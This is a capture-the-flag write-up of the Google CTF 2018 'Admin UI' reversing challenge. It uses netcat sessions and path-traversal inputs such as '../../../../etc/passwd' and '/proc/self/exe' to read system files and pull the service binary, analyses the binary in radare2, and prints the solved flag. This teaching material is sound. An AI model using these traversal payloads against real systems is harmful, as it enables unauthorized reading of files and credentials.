---
layout: article
title: Reversing with Radare2 - Google CTF 2018 - Part 1
permalink: /page/reversing-with-radare2-part-1
key: page-article-header-overlay-background-image-HB
cover: /assets/images/thumbs/reversing-with-radare2-part-1.png
header:
  theme: dark
  background: 'linear-gradient(135deg, rgb(195, 55, 100), rgb(29, 38, 113))'
article_header:
  type: overlay
  theme: dark
  background_color: '#0F2027'
  background_image:
    gradient: 'linear-gradient(135deg, rgba(195, 55, 100, .6), rgba(29, 38, 113, .6))'
    src: /assets/images/posts/reversing-with-radare2-part-1/cover.png
---

Tackling reverse engineering challenges in Google CTF Beginners Quest with Radare2 (Admin UI).

<!--more-->

<style>
  .page__header .header__brand path {
    fill: rgba(255, 255, 255, .95);
  }
</style>

## Objective
In the summer of 2018, Gynvael of Google Security broadcasted a <a href="https://www.youtube.com/watch?v=qDYwcIf0LZw" target="_blank">livestream</a> of the Google CTF 2018 Beginners Quest series. In the stream, he provides thorough explanations of solutions to each of the challenges provided by Google.

The Beginners Quest series categorizes each challenge based on the type of security vulnerability presented. To find more information on the challenges, visit the official CTF <a href="https://capturetheflag.withgoogle.com/" target="_blank">site</a>.   

In the series, Google challenges participants with a number of reverse engineering tasks, specifically, Admin UI 1-3 and Message of the Day. Our goal is to work through these challenges without the help of a decompiler. Instead, we'll be using <code>radare2</code> to disassemble the relevant binaries and see how we can come up with the same solutions provided by Gynvael in his livestream.


## Admin UI

<img src="/assets/images/posts/reversing-with-radare2-part-1/node.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/60.png" alt="" class="center">

<br>
The Admin UI line begins with the mysterious management interface which we can connect to through netcat on port 1337. When we connect to the interface, our console shows a menu. It might be tempting to start fuzzing the input to see what kind of crashes we can cause, but it's always worthwhile to try the basic commands first to get an of the functions behind each option.
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/61.png" alt="" class="center">

```bash
root@kali:~/google-ctf-2018/admin-ui# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
1
Please enter the backdoo^Wservice password:
123456  
Incorrect, the authorities have been informed!
root@kali:~/google-ctf-2018/admin-ui# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
1
Error: No such file or directory
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
```

When we try to access the first patchnotes document displayed by the console, using "1" as input, we get a suspicious response -- "Error: No such file or directory." The output resembles what the terminal might send back if we try to <code>cat</code> a nonexistent file. 

```bash
root@kali:~/google-ctf-2018/admin-ui# cat missing-file
cat: missing-file: No such file or directory
```

Let's test for local file inclusion using <b>/etc/passwd</b>


```
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
user:x:1337:1337::/home/user:
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
```

Looks like we have local file inclusion in the application. When we check <b>/self/proc/exe</b> for the executable being run by the current pid, we get some binary output. 

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/62.png" alt="" class="center">

If we can redirect the output to a file on our machine, we may be able to debug the binary to figure out what's going on under the hood. Before we do, we have to clean up the file contents using <code>hexeditor -b</code> since the menu was appended to the beginning.

```bash
root@kali:~/google-ctf-2018/admin-ui# echo -e "2\n../../../../../../proc/self/exe" | nc mngmnt-iface.ctfcompetition.com 1337 > main
^C

root@kali:~/google-ctf-2018/admin-ui# file main
main: data

root@kali:~/google-ctf-2018/admin-ui# hexeditor -b main 
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/63.png" alt="" class="center">

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/64.png" alt="" class="center">

We can delete all the bytes before the ELF magic number <b>0x7F 0x45 0x4C 0x46</b> or <b>0x7F 'E' 'L' 'F'</b> on line <b>B0</b>.

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/65.png" alt="" class="center">

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/66.png" alt="" class="center">

Doing this converts our <b>main</b> file to a proper executable. 

```bash
root@kali:~/google-ctf-2018/admin-ui# file main 
main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e78c178ffb1ddc700123dbda1a49a695fafd6c84, with debug_info, not stripped

```

Notice we have <b>debug_info</b> available. Using <b>radare2</b>, we can examine <b>main</b> in detail using the <code>vv</code> option.

```bash
root@kali:~/google-ctf-2018/admin-ui# r2 main 
[0x41414150]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze len bytes of instructions for references (aar)
[x] Analyze function calls (aac)
[ ] [*] Use -AA or aaaa to perform additional experimental analysis.
[x] Constructing a function name for fcn.* and sym.func.* functions (aan))
[0x41414150]> vv
```

Here we get a list of symbols that include the functions within our executable. If we examine the <b>primary_login__</b> function, we'll find <b>obj.FLAG_FILE</b> corresponds to simply, <b>flag</b>.

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/67.png" alt="" class="center">

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/68.png" alt="" class="center">

If we reconnect back to the management interface and check the directory serving patchnotes for a file named <b>flag</b>, we successfully print the contents of our flag to console.

```bash
root@kali:~/google-ctf-2018/admin-ui# nc mngmnt-iface.ctfcompetition.com 1337
=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
2
The following patchnotes were found:
 - Version0.2
 - Version0.3
Which patchnotes should be shown?
../flag
CTF{I_luv_buggy_sOFtware}=== Management Interface ===
 1) Service access
 2) Read EULA/patch notes
 3) Quit
```

<br>
<br>
### Solution
<b>CTF{I_luv_buggy_sOFtware}</b>


In part 2, we'll look at the next quest in this line, Admin UI 2.